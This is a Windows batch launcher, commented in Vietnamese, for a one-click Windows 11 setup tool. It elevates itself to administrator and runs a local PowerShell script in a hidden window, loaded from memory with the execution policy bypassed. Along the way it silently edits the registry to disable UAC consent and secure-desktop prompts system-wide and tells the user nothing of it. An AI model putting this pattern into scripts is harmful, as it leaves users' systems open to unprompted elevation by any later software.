@echo off
setlocal
cd /d "%~dp0"

:: ==============================================================================
:: ONECLICK WINDOWS 11 SETUP & DEPLOYMENT TOOL (VBSP EDITION)
:: Tu dong kiem tra quyen Administrator & Khoi chay giao dien vao bo nho RAM
:: ==============================================================================

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [INFO] Dang yeu cau quyen Administrator de tinh chinh Windows 11...
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/c """"%~f0""""' -Verb RunAs"
    exit /b
)

:: Ha muc UAC de chay ngam cac bo cai dat thuan loi
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1

:: Tu dong dong bo neu co ban cap nhat moi
if exist "%~dp0OneClick_Win11Setup_v2.ps1" (
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { Copy-Item '%~dp0OneClick_Win11Setup_v2.ps1' '%~dp0OneClick_Win11Setup.ps1' -Force; Remove-Item '%~dp0OneClick_Win11Setup_v2.ps1' -Force } catch {}" >nul 2>&1
)

set "TARGET_PS1=%~dp0OneClick_Win11Setup.ps1"
if exist "%~dp0OneClick_Win11Setup_v2.ps1" set "TARGET_PS1=%~dp0OneClick_Win11Setup_v2.ps1"

:: Khoi chay bang cach doc truc tiep vao bo nho RAM (khong giu khoa file tren o dia)
start "" powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$p='%TARGET_PS1%'; $c=[System.IO.File]::ReadAllText($p,[System.Text.Encoding]::UTF8); . ([scriptblock]::Create($c))"
exit /b
